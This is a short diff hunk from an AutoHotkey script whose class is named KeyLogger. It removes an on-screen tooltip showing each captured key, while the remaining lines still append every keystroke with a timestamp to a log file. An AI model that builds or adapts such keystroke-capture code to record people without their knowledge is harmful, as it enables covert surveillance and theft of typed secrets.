@@ -100,7 +100,6 @@ class KeyLogger {
 			if (StrLen(key) == 2 && SubStr(key, 1, 1) == "+")
 				key := SubStr(key, 2, 1)
 		}
-		Tooltip(key)
 		this.logAddHeader()
 		FileAppend(Format("{1} Key:`t {2}`n", FormatTime(A_Now, "HH:mm:ss"), key), this.path, "UTF-8")
 	}
